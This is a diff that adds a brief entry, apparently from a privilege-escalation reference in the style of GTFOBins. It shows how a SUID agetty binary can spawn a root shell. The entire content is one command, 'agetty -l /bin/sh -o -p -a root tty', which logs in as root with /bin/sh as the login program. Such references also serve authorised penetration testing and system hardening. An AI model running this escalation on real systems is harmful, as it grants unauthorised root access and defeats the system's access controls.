@@ -1,0 +1,8 @@
+agetty
+======
+
+Shell
+-----
+
+[SUID]
+    agetty -l /bin/sh -o -p -a root tty
